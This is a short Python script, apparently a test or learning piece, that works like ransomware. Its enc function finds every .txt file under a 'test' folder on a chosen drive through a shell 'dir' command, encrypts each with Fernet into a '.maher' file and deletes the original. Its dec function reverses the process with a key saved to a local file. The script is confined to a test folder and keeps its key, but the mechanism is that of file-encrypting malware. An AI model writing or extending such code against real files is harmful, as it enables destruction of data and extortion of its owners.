from subprocess import check_output
from cryptography.fernet import Fernet
import os

def enc(key="^1",drive="D"):
    if key == "^1":  
        key = Fernet.generate_key()

    Encrypt = Fernet(key)

    new_file = open("key", "w")   #just for test
    new_file.write(str(key))      #just for test

    cmd = check_output(f"{drive}: && cd test && dir /S /B *.txt", shell=True).decode().split() 

    for i in cmd:
        try:
            with open(i, "rb") as thisfile:
                data = thisfile.read()
                enc_data = Encrypt.encrypt(data)
                new_file = open(i+".maher", "wb")
                new_file.write(enc_data)
                thisfile.close()
                new_file.close()
                os.remove(i)
                print(i + "------------> " + "Encrypted")
        except:
            pass


def dec(key="^1",drive="D"):
    if key == "^1":
        keyfile = open("key", "r")
        key = keyfile.read()
        key = b"%s" % bytes(key.split("'")[1].encode())
        print(key)


    
    Decrypt = Fernet(key)

    cmd = check_output(f"{drive}: && cd test && dir /S /B *.maher", shell=True).decode().split()

    for i in cmd:
            try:
                with open(i, "rb") as thisfile:
                    data = thisfile.read()
                    dec_data = Decrypt.decrypt(data)
                    new_file = open(i.replace(".maher", ""), "wb")
                    new_file.write(dec_data)
                    thisfile.close()
                    new_file.close()
                    os.remove(i)
                    print(i + "------------> " + "Decrypted")
            except:
                pass


#enc(drive="f")
dec(drive="f")
